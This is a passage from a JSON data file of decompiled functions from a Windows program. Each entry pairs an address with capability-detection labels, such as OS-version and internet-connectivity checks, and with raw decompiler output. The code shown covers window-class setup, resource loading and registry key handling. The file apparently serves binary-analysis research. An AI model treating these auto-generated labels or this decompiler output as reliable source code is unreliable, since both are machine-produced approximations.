0xd, L\"ATL:%p\", in_ECX);\n                in_ECX[10] = iVar4;\n            }\n            var_6ch = *in_ECX;\n            uStack108 = in_ECX[1];\n            uStack104 = in_ECX[2];\n            uStack100 = in_ECX[3];\n            var_5ch = in_ECX[4];\n            uStack92 = in_ECX[5];\n            uStack88 = in_ECX[6];\n            uStack84 = in_ECX[7];\n            var_4ch = in_ECX[8];\n            uStack76 = in_ECX[9];\n            uStack72 = in_ECX[10];\n            uStack68 = in_ECX[0xb];\n            iVar2 = (*pcVar7)(in_ECX[5], iVar4, &var_6ch);\n            *(in_ECX + 0x10) = iVar2;\n            uVar6 = *0x6cc7e4;\n            pcVar7 = _sym.imp.USER32.dll_GetSystemMetrics;\n            if (iVar2 == 0) {\n                if (in_ECX[0x17] != 0) {\n                    uVar5 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0xc, 0);\n                    uVar5 = (*pcVar7)(0xb, uVar5);\n                    pcVar1 = _sym.imp.USER32.dll_LoadImageW;\n                    uVar6 = (*_sym.imp.USER32.dll_LoadImageW)(uVar6, *(var_4h + 0x17), 1, uVar5);\n                    var_4h[6] = uVar6;\n                    uVar6 = *0x6cc7e4;\n                    uVar5 = (*pcVar7)(0x32, 0);\n                    uVar5 = (*pcVar7)(0x31, uVar5);\n                    uVar6 = (*pcVar1)(uVar6, *(var_4h + 0x17), 1, uVar5);\n                    var_4h[0xb] = uVar6;\n                    in_ECX = var_4h;\n                }\n                uVar3 = (*_sym.imp.USER32.dll_RegisterClassExW)(in_ECX);\n                *(in_ECX + 0x10) = uVar3;\n            }\n        }\n        in_EAX = (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x6c9c60);\n    }\n    if (in_ECX[0xc] != 0) {\n        *arg_8h = in_ECX[0xd];\n        in_EAX = arg_8h;\n    }\n    return in_EAX & 0xffff0000 | *(in_ECX + 0x10);\n}\n",
        "token_count": 1500
    },
    "0040c460": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040c53c)\n// WARNING: Removing unreachable block (ram,0x0040c55c)\n// WARNING: Removing unreachable block (ram,0x0040c555)\n\nvoid __cdecl fcn.0040c460(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint unaff_EDI;\n    uint var_418h;\n    uint var_414h;\n    uint lpName;\n    uint lpType;\n    uint var_408h;\n    uint var_404h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_LoadLibraryExW;\n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(arg_8h, 0, 0x60);\n    if ((iVar2 == 0) && (iVar2 = (*pcVar1)(arg_8h, 0, 2),  iVar2 == 0)) {\n        fcn.00402ef0();\n    }\n    else {\n        iVar3 = (*_sym.imp.KERNEL32.dll_FindResourceW)(iVar2, arg_ch, arg_10h);\n        if (iVar3 == 0) {\n            fcn.00402ef0();\n        }\n        else {\n            iVar4 = (*_sym.imp.KERNEL32.dll_LoadResource)(iVar2, iVar3);\n            if (iVar4 == 0) {\n                fcn.00402ef0();\n            }\n            else {\n                uVar5 = (*_sym.imp.KERNEL32.dll_SizeofResource)(iVar2, iVar3);\n                if (uVar5 <= uVar5 + 1) {\n                    fcn.00402ad0(uVar5 + 1);\n                }\n            }\n        }\n        if (iVar2 != 0) {\n            (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar2);\n        }\n    }\n    if (*0x10 != 0x408) {\n        fcn.00405cc0();\n    }\n    fcn.004303e9(unaff_EDI);\n    return;\n}\n",
        "token_count": 497
    },
    "0040c5c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040c5c0(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    int16_t iVar1;\n    bool bVar2;\n    int16_t **ppiVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint arg_8h_00;\n    uint *unaff_EBX;\n    uint *puStack8776;\n    uint uStack8772;\n    uint uStack8768;\n    uint uStack8764;\n    uint *puStack8760;\n    uint uStack8756;\n    uint uStack8752;\n    int32_t iStack8748;\n    uint *puStack8744;\n    uint uStack8740;\n    int16_t **ppiStack8736;\n    uint *puStack8728;\n    uint *puStack8724;\n    uint auStack8720 [2048];\n    uint lpString1;\n    uint uStack72;\n    uint *puStack68;\n    uint *puStack64;\n    uint *puStack60;\n    uint *puStack56;\n    uint *puStack52;\n    uint *puStack48;\n    uint *puStack44;\n    uint *puStack40;\n    uint *puStack36;\n    uint *puStack32;\n    uint *puStack28;\n    uint *var_4h;\n    \n    fcn.00430400();\n    puStack8728 = arg_ch;\n    puStack8744 = NULL;\n    uStack8740 = 0;\n    ppiStack8736 = NULL;\n    iVar4 = fcn.00406910(arg_8h);\n    var_4h = unaff_EBX;\n    if (iVar4 < 0) goto code_r0x0040cf57;\n    iVar1 = *arg_8h;\njoined_r0x0040c61e:\n    if (iVar1 == 0x7d) goto code_r0x0040cf43;\n    puStack28 = arg_8h;\n    iStack8748 = 1;\n    puStack32 = 0x40c646;\n    iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)();\n    puStack32 = 0x47b898;\n    puStack36 = arg_8h;\n    puStack40 = 0x40c657;\n    iVar5 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)();\n    if ((iVar5 == 0) || (iVar4 == 0)) {\n        puStack28 = 0x40c66f;\n        iVar5 = fcn.00406910(arg_8h);\n        if (iVar5 < 0) goto code_r0x0040cf43;\n        if (arg_10h == NULL) goto code_r0x0040c76f;\n        iVar1 = *arg_8h;\n        puStack8760 = NULL;\n        uStack8752 = 0;\n        puVar6 = arg_8h;\n        while (iVar1 != 0) {\n            if (iVar1 == 0x5c) {\n                if (puVar6 != NULL) goto code_r0x0040cf43;\n                break;\n            }\n            puStack28 = 0x40c6ae;\n            puVar6 = (*_sym.imp.USER32.dll_CharNextW)();\n            iVar1 = *puVar6;\n        }\n        iVar5 = 0x47b8e8;\n        do {\n            puStack28 = arg_8h;\n            puStack32 = 0x40c6d9;\n            iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)();\n            if (iVar7 == 0) goto code_r0x0040c728;\n            iVar5 = iVar5 + 4;\n        } while (iVar5 < 0x47b918);\n        puStack8760 = puStack8728;\n        uStack8756 = 0;\n        uStack8752 = 0;\n        puStack28 = 0x40c714;\n        fcn.0040bf70(arg_8h);\n        puStack8760 = NULL;\n        uStack8752 = 0;\ncode_r0x0040c728:\n        if (iVar4 != 0) {\n            uStack8756 = 0;\n            goto code_r0x0040c76f;\n        }\n        puStack28 = 0x40c73a;\n        iVar4 = fcn.00406910(arg_8h);\n        if (iVar4 < 0) goto code_r0x0040cf43;\n        puStack32 = 0x40c74c;\n        iVar4 = fcn.0040d610(arg_8h);\n        if (iVar4 < 0) goto code_r0x0040cf43;\n        uStack8756 = 0;\n    }\n    else {\ncode_r0x0040c76f:\n        puStack28 = arg_8h;\n        puStack32 = 0x40c77b;\n        iVar5 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)();\n        iVar4 = iStack8748;\n        if (iVar5 == 0) {\n            iVar4 = 0;\n            iStack8748 = 0;\n            iVar5 = fcn.00406910(arg_8h);\n            if (iVar5 < 0) goto code_r0x0040cf43;\n        }\n        puStack28 = arg_8h;\n        puStack32 = 0x40c7b1;\n        iVar5 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)();\n        if (iVar5 == 0) {\n            puStack28 = 0x40c7cb;\n            iVar5 = fcn.00406910(&stack0xffffddf0);\n            if (iVar5 < 0) goto code_r0x0040cf43;\n            puStack32 = 0x40c7e1;\n            iVar5 = fcn.00406910(arg_8h);\n            if ((iVar5 < 0) || (*arg_8h != 0x3d)) goto code_r0x0040cf43;\n            if (arg_10h != NULL) {\n                puStack8776 = puStack8728;\n                puStack36 = &stack0xffffddf0;\n                puStack32 = arg_8h;\n                uStack8772 = 0;\n                uStack8768 = 0;\n                puStack44 = 0x40c837;\n                iVar4 = fcn.00402620(&stack0xffffddb8, puStack36, arg_8h);\n                puStack8776 = NULL;\n                uStack8768 = 0;\n                if (-1 < iVar4) {\n                    uStack8772 = 0;\n                    goto code_r0x0040cb7e;\n                }\n                goto code_r0x0040cf43;\n            }\n            if ((arg_14h == NULL) && (iVar4 != 0)) {\n                puStack32 = &stack0xffffddd4;\n                iStack8748 = 0;\n                puStack36 = 0x20006;\n                puStack40 = NULL;\n                puStack44 = NULL;\n                puStack48 = puStack8728;\n                puStack52 = 0x40c894;\n                iVar4 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)();\n                iVar5 = iStack8748;\n                if (iVar4 != 0) goto code_r0x0040cf39;\n                puStack28 = iStack8748;\n                puStack32 = 0x40c8b0;\n                iVar4 = (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)();\n                if ((iVar4 != 0) && (iVar4 != 2)) {\n                    puStack28 = 0x40cf1a;\n                    fcn.00402f10(iVar4);\n                    if (iVar5 != 0) {\n                        puStack28 = 0x40cf2a;\n                        (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n                    }\n                    goto code_r0x0040cf43;\n                }\n                if (iVar5 != 0) {\n                    puStack28 = 0x40c8c8;\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n                }\n            }\n            puStack28 = 0x40c8d4;\n            iVar4 = fcn.0040d610(arg_8h);\n            if (-1 < iVar4) goto code_r0x0040cf08;\n            goto code_r0x0040cf43;\n        }\n        iVar1 = *arg_8h;\n        puVar6 = arg_8h;\n        ppiVar3 = ppiStack8736;\n        while (ppiStack8736 = ppiVar3,  iVar1 != 0) {\n            if (iVar1 == 0x5c) {\n                if (puVar6 != NULL) goto code_r0x0040cf43;\n                break;\n            }\n            puStack28 = 0x40c8fd;\n            puVar6 = (*_sym.imp.USER32.dll_CharNextW)();\n            ppiVar3 = ppiStack8736;\n            iVar1 = *puVar6;\n        }\n        if (arg_10h == NULL) {\n            if (arg_14h == NULL) {\n                puStack8724 = NULL;\n                if (ppiVar3 == NULL) {\ncode_r0x0040cc50:\n                    puStack28 = 0x20019;\n                    puStack32 = NULL;\n                    puStack36 = arg_8h;\n                    puStack44 = 0x40cc6b;\n                    puStack40 = puStack8728;\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)();\n                }\n                else if (*ppiVar3 == NULL) {\n                    if (ppiVar3[1] != NULL) goto code_r0x0040cc50;\ncode_r0x0040cc49:\n                    iVar4 = 1;\n                }\n                else {\n                    puStack28 = 0x40cc0a;\n                    iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n                    if (iVar4 == 0) {\n                        iVar4 = 1;\n                        goto code_r0x0040cca1;\n                    }\n                    pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n                    if (pcVar8 == NULL) goto code_r0x0040cc49;\n                    puStack28 = *ppiVar3;\n                    puStack32 = &stack0xffffddec;\n                    puStack36 = 0x20019;\n                    puStack40 = NULL;\n                    puStack44 = arg_8h;\n                    puStack48 = puStack8728;\n                    puStack52 = 0x40cc41;\n                    iVar4 = (*pcVar8)();\n                }\n                if (iVar4 == 0) {\n                    if (puStack8744 != NULL) {\n                        puStack28 = 0x40cc82;\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n                    }\n                    puStack8744 = puStack8724;\n                    uStack8740 = 0;\n                }\n            }\n            else {\n                iVar4 = 2;\n            }\ncode_r0x0040cca1:\n            puStack8724 = 0x1;\n            if (iVar4 == 0) {\n                puStack8724 = arg_14h;\n            }\n            var_4h = &fcn.0040c5c0::lpString1;\n            arg_8h_00 = fcn.0043bf88(var_4h, 0x104, arg_8h, 0xffffffff);\n            fcn.00402c90(arg_8h_00);\n            iVar5 = fcn.00406910(arg_8h);\n            if ((iVar5 < 0) || (iVar5 = fcn.0040d610(arg_8h),  iVar5 < 0)) goto code_r0x0040cf43;\n            if (*arg_8h == 0x7b) {\n                puVar6 = arg_8h;\n                do {\n                    iVar1 = *puVar6;\n                    puVar6 = puVar6 + 2;\n                } while (iVar1 != 0);\n                if (puVar6 - (arg_8h + 2) >> 1 == 1) {\n                    var_4h = NULL;\n                    iVar5 = fcn.0040c5c0(0x40cd34, puStack8744, NULL, puStack8724);\n                    if (((iVar5 < 0) && (puStack8724 == NULL)) || (iVar5 = fcn.00406910(arg_8h),  iVar5 < 0))\n                    goto code_r0x0040cf43;\n                }\n            }\n            if (iVar4 != 2) {\n                if (iVar4 == 0) {\n                    if (arg_14h != NULL) {\n                        puStack28 = NULL;\n                        puStack32 = NULL;\n                        puStack36 = NULL;\n                        puStack40 = NULL;\n                        puStack44 = NULL;\n                        puStack48 = NULL;\n                        puStack52 = &stack0xffffddec;\n                        puStack8724 = NULL;\n                        puStack56 = NULL;\n                        puStack60 = NULL;\n                        puStack64 = NULL;\n                        puStack68 = puStack8744;\n                        uStack72 = 0x40cdb5;\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_RegQueryInfoKeyW)();\n                        if ((iVar4 == 0) && (puStack8724 != NULL)) {\n                            iVar4 = 0x47b8e8;\n                            do {\n                                puStack28 = &fcn.0040c5c0::lpString1;\n                                puStack32 = 0x40cddf;\n                                iVar5 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)();\n                                if (iVar5 == 0) goto code_r0x0040cf08;\n                                iVar4 = iVar4 + 4;\n                            } while (iVar4 < 0x47b918);\n                            if (iStack8748 != 0) {\n                                puStack28 = 0x40ce11;\n                                fcn.0040bf70(&fcn.0040c5c0::lpString1);\n                            }\n                            goto code_r0x0040cf08;\n                        }\n                    }\n                    puStack28 = NULL;\n                    puStack32 = NULL;\n                    puStack36 = NULL;\n                    puStack40 = NULL;\n                    puStack44 = NULL;\n                    puStack48 = NULL;\n                    puStack52 = &stack0xffffddec;\n                    puStack8724 = NULL;\n                    puStack56 = NULL;\n                    puStack60 = NULL;\n                    puStack64 = NULL;\n                    puStack68 = puStack8744;\n                    uStack72 = 0x40ce47;\n                    iVar5 = (*_sym.imp.ADVAPI32.dll_RegQueryInfoKeyW)();\n                    bVar2 = puStack8724 == NULL;\n                    iVar4 = 0;\n                    if (puStack8744 != NULL) {\n                        puStack28 = 0x40ce6e;\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n                        puStack8744 = NULL;\n                    }\n                    uStack8740 = 0;\n                    if (iVar4 == 0) {\n                        if ((iStack8748 != 0) && (iVar5 != 0 || bVar2)) {\n                            if (*0x6cc6ec == '\\0') {\n                                puStack28 = 0x40cea7;\n                                puStack28 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n                                if (puStack28 == NULL) {\n                                    *0x6cc6ec = '\\x01';\n                                }\n                                else {\n                                    puStack32 = 0x40ceb7;\n                                    *0x6cc6e8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n                                    *0x6cc6ec = '\\x01';\n                                }\n                            }\n                            if (*0x6cc6e8 == NULL) {\n                                puStack28 = puStack8728;\n                                puStack32 = 0x40cf04;\n                                iVar4 = (*_sym.imp.ADVAPI32.dll_RegDeleteKeyW)();\n                            }\n                            else {\n                                puStack28 = NULL;\n                                puStack32 = &fcn.0040c5c0::lpString1;\n                                puStack36 = puStack8728;\n                                puStack40 = 0x40ceef;\n                                iVar4 = (**0x6cc6e8)();\n                            }\n                            if (iVar4 != 0) goto code_r0x0040cf39;\n                        }\n                        goto code_r0x0040cf08;\n                    }\n                    goto code_r0x0040cf39;\n                }\n                if (arg_14h == NULL) goto code_r0x0040cf39;\n            }\n            goto code_r0x0040cf08;\n        }\n        puStack8724 = NULL;\n        if (ppiVar3 != NULL) {\n            if (*ppiVar3 == NULL) {\n                if (ppiVar3[1] != NULL) goto code_r0x0040c981;\ncode_r0x0040c97a:\n                iVar4 = 1;\n                goto code_r0x0040c99c;\n            }\n            puStack28 = 0x40c93f;\n            puStack28 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n            if (puStack28 != NULL) {\n                puStack32 = 0x40c953;\n                pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n                if (pcVar8 == NULL) goto code_r0x0040c97a;\n                puStack28 = *ppiVar3;\n                puStack32 = &stack0xffffddec;\n                puStack36 = 0x2001f;\n                puStack40 = NULL;\n                puStack44 = arg_8h;\n                puStack48 = puStack8728;\n                puStack52 = 0x40c972;\n                iVar4 = (*pcVar8)();\n                goto code_r0x0040c99c;\n            }\ncode_r0x0040c9d7:\n            puVar6 = puStack8744;\n            puStack8724 = NULL;\n            if (ppiVar3 == NULL) {\ncode_r0x0040ca37:\n                puStack28 = 0x20019;\n                puStack32 = NULL;\n                puStack36 = arg_8h;\n                puStack40 = puStack8728;\n                puStack44 = 0x40ca52;\n                iVar4 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)();\ncode_r0x0040ca52:\n                if (iVar4 == 0) {\n                    if (puVar6 != NULL) {\n                        puStack28 = 0x40ca61;\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n                    }\n                    puStack8744 = puStack8724;\n                    uStack8740 = 0;\n                    puVar6 = puStack8724;\n                    if (iVar4 == 0) goto code_r0x0040cb45;\n                }\n            }\n            else {\n                if (*ppiVar3 == NULL) {\n                    if (ppiVar3[1] != NULL) goto code_r0x0040ca37;\ncode_r0x0040ca30:\n                    iVar4 = 1;\n                    goto code_r0x0040ca52;\n                }\n                puStack28 = 0x40c9f5;\n                puStack28 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n                if (puStack28 != NULL) {\n                    puStack32 = 0x40ca09;\n                    pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n                    if (pcVar8 == NULL) goto code_r0x0040ca30;\n                    puStack28 = *ppiVar3;\n                    puStack32 = &stack0xffffddec;\n                    puStack36 = 0x20019;\n                    puStack40 = NULL;\n                    puStack44 = arg_8h;\n                    puStack48 = puStack8728;\n                    puStack52 = 0x40ca28;\n                    iVar4 = (*pcVar8)();\n                    goto code_r0x0040ca52;\n                }\n            }\n            puStack8724 = NULL;\n            if (ppiVar3 == NULL) {\ncode_r0x0040caec:\n                puStack28 = &stack0xffffddec;\n                puStack32 = NULL;\n                puStack36 = 0x2001f;\n                puStack40 = NULL;\n                puStack44 = NULL;\n                puStack48 = NULL;\n                puStack52 = arg_8h;\n                puStack56 = puStack8728;\n                puStack60 = 0x40cb14;\n                iVar4 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)();\n            }\n            else if (*ppiVar3 == NULL) {\n                if (ppiVar3[1] != NULL) goto code_r0x0040caec;\ncode_r0x0040cae5:\n                iVar4 = 1;\n            }\n            else {\n                puStack28 = 0x40ca9d;\n                puStack28 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n                if (puStack28 == NULL) {\n                    iVar4 = 1;\n                    goto code_r0x0040cf39;\n                }\n                puStack32 = 0x40cab1;\n                pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n                if (pcVar8 == NULL) goto code_r0x0040cae5;\n                puStack28 = *ppiVar3;\n                puStack32 = &stack0xffffddc4;\n                puStack36 = &stack0xffffddec;\n                puStack40 = NULL;\n                puStack44 = 0x2001f;\n                puStack48 = NULL;\n                puStack52 = NULL;\n                puStack56 = NULL;\n                puStack60 = arg_8h;\n                puStack64 = puStack8728;\n                puStack68 = 0x40cadd;\n                iVar4 = (*pcVar8)();\n            }\n            if (iVar4 == 0) {\n                if (puVar6 != NULL) {\n                    puStack28 = 0x40cb27;\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n                }\n                puStack8744 = puStack8724;\n                uStack8740 = 0;\n                if (iVar4 == 0) goto code_r0x0040cb45;\n            }\ncode_r0x0040cf39:\n            puStack28 = 0x40cf3e;\n            fcn.00402f10(iVar4);\n            goto code_r0x0040cf43;\n        }\ncode_r0x0040c981:\n        puStack28 = 0x2001f;\n        puStack32 = NULL;\n        puStack36 = arg_8h;\n        puStack44 = 0x40c99c;\n        puStack40 = puStack8728;\n        iVar4 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)();\ncode_r0x0040c99c:\n        if (iVar4 != 0) goto code_r0x0040c9d7;\n        if (puStack8744 != NULL) {\n            puStack28 = 0x40c9b1;\n            iVar4 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n        }\n        puStack8744 = puStack8724;\n        uStack8740 = 0;\n        if (iVar4 != 0) goto code_r0x0040c9d7;\ncode_r0x0040cb45:\n        uStack8740 = 0;\n        puStack28 = 0x40cb53;\n        puStack8744 = puStack8724;\n        iVar4 = fcn.00406910(arg_8h);\n        if (iVar4 < 0) goto code_r0x0040cf43;\n        if (*arg_8h != 0x3d) goto code_r0x0040cb7e;\n        puStack28 = arg_8h;\n        puStack32 = NULL;\n        puStack40 = 0x40cb74;\n        iVar4 = fcn.00402620(&stack0xffffddd8, 0, arg_8h);\n        if (iVar4 < 0) goto code_r0x0040cf43;\n    }\ncode_r0x0040cb7e:\n    if (*arg_8h == 0x7b) {\n        puVar6 = arg_8h;\n        do {\n            iVar1 = *puVar6;\n            puVar6 = puVar6 + 2;\n        } while (iVar1 != 0);\n        if (puVar6 - (arg_8h + 2) >> 1 == 1) {\n            puStack28 = arg_10h;\n            puStack32 = puStack8744;\n            puStack40 = 0x40cbbb;\n            iVar4 = fcn.0040c5c0(arg_8h, puStack8744, arg_10h, NULL);\n            if (iVar4 < 0) goto code_r0x0040cf43;\n            puStack44 = 0x40cbcd;\n            iVar4 = fcn.00406910(arg_8h);\n            if (iVar4 < 0) goto code_r0x0040cf43;\n        }\n    }\ncode_r0x0040cf08:\n    iVar1 = *arg_8h;\n    goto joined_r0x0040c61e;\ncode_r0x0040cf43:\n    if (puStack8744 != NULL) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n    }\ncode_r0x0040cf57:\n    fcn.004303e9(var_4h);\n    return;\n}\n",
        "token_count": 5743
    },
    "0040d010": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d010(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint32_t uVar5;\n    \n    if ((arg_8h < 0) || (iVar4 = in_ECX[2],  iVar4 <= arg_8h)) {\n        return 0;\n    }\n    if (arg_8h == iVar4 + -1) goto code_r0x0040d106;\n    uVar5 = (iVar4 - arg_8h) * 4;\n    iVar4 = *in_ECX + arg_8h * 4;\n    uVar1 = uVar5 - 4;\n    if (uVar1 == 0) {\ncode_r0x0040d092:\n        uVar3 = 0;\n    }\n    else if ((iVar4 == 0) || (iVar4 + 4 == 0)) {\n        puVar2 = fcn.0043bcb5();\n        *puVar2 = 0x16;\n        fcn.0043bb3e();\n        uVar3 = 0x16;\n    }\n    else {\n        if (uVar1 <= uVar5) {\n            fcn.00431830(iVar4, iVar4 + 4, uVar1);\n            goto code_r0x0040d092;\n        }\n        puVar2 = fcn.0043bcb5();\n        *puVar2 = 0x22;\n        fcn.0043bb3e();\n        uVar3 = 0x22;\n    }\n    fcn.00402c90(uVar3);\n    uVar5 = (in_ECX[2] - arg_8h) * 4;\n    iVar4 = in_ECX[1] + arg_8h * 4;\n    uVar1 = uVar5 - 4;\n    if (uVar1 == 0) {\ncode_r0x0040d0fb:\n        uVar3 = 0;\n    }\n    else if ((iVar4 == 0) || (iVar4 + 4 == 0)) {\n        puVar2 = fcn.0043bcb5();\n        *puVar2 = 0x16;\n        fcn.0043bb3e();\n        uVar3 = 0x16;\n    }\n    else {\n        if (uVar1 <= uVar5) {\n            fcn.00431830(iVar4, iVar4 + 4, uVar1);\n            goto code_r0x0040d0fb;\n        }\n        puVar2 = fcn.0043bcb5();\n        *puVar2 = 0x22;\n        fcn.0043bb3e();\n        uVar3 = 0x22;\n    }\n    fcn.00402c90(uVar3);\ncode_r0x0040d106:\n    iVar4 = fcn.0043bd7a(*in_ECX, in_ECX[2] + -1, 4);\n    if ((iVar4 != 0) || (in_ECX[2] == 1)) {\n        *in_ECX = iVar4;\n    }\n    iVar4 = fcn.0043bd7a(in_ECX[1], in_ECX[2] + -1, 4);\n    if ((iVar4 != 0) || (in_ECX[2] == 1)) {\n        in_ECX[1] = iVar4;\n    }\n    in_ECX[2] = in_ECX[2] + -1;\n    return 1;\n}\n",
        "token_count": 807
    },
    "0040d160": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d160(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint32_t uVar5;\n    \n    if ((arg_8h < 0) || (iVar4 = in_ECX[2],  iVar4 <= arg_8h)) {\n        return 0;\n    }\n    if (arg_8h == iVar4 + -1) goto code_r0x0040d256;\n    uVar5 = (iVar4 - arg_8h) * 4;\n    iVar4 = *in_ECX + arg_8h * 4;\n    uVar1 = uVar5 - 4;\n    if (uVar1 == 0) {\ncode_r0x0040d1e2:\n        uVar3 = 0;\n    }\n    else if ((iVar4 == 0) || (iVar4 + 4 == 0)) {\n        puVar2 = fcn.0043bcb5();\n        *puVar2 = 0x16;\n        fcn.0043bb3e();\n        uVar3 = 0x16;\n    }\n    else {\n        if (uVar1 <= uVar5) {\n            fcn.00431830(iVar4, iVar4 + 4, uVar1);\n            goto code_r0x0040d1e2;\n        }\n        puVar2 = fcn.0043bcb5();\n        *puVar2 = 0x22;\n        fcn.0043bb3e();\n        uVar3 = 0x22;\n    }\n    fcn.00402c90(uVar3);\n    uVar5 = (in_ECX[2] - arg_8h) * 4;\n    iVar4 = in_ECX[1] + arg_8h * 4;\n    uVar1 = uVar5 - 4;\n    if (uVar1 == 0) {\ncode_r0x0040d24b:\n        uVar3 = 0;\n    }\n    else if ((iVar4 == 0) || (iVar4 + 4 == 0)) {\n        puVar2 = fcn.0043bcb5();\n        *puVar2 = 0x16;\n        fcn.0043bb3e();\n        uVar3 = 0x16;\n    }\n    else {\n        if (uVar1 <= uVar5) {\n            fcn.00431830(iVar4, iVar4 + 4, uVar1);\n            goto code_r0x0040d24b;\n        }\n        puVar2 = fcn.0043bcb5();\n        *puVar2 = 0x22;\n        fcn.0043bb3e();\n        uVar3 = 0x22;\n    }\n    fcn.00402c90(uVar3);\ncode_r0x0040d256:\n    iVar4 = fcn.0043bd7a(*in_ECX, in_ECX[2] + -1, 4);\n    if ((iVar4 != 0) || (in_ECX[2] == 1)) {\n        *in_ECX = iVar4;\n    }\n    iVar4 = fcn.0043bd7a(in_ECX[1], in_ECX[2] + -1, 4);\n    if ((iVar4 != 0) || (in_ECX[2] == 1)) {\n        in_ECX[1] = iVar4;\n    }\n    in_ECX[2] = in_ECX[2] + -1;\n    return 1;\n}\n",
        "token_count": 811
    },
    "0040d960": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040d960(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (((*(param_1 + 0x58) & 4) != 0) && (*(param_1 + 0xac) == 0)) {\n        uVar1 = (*_sym.imp.USER32.dll_GetFocus)();\n        *(param_1 + 0xac) = uVar1;\n    }\n    (*_sym.imp.USER32.dll_SetFocus)(*(param_1 + 4));\n    return;\n}\n",
        "token_count": 117
    },
    "0040d990": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
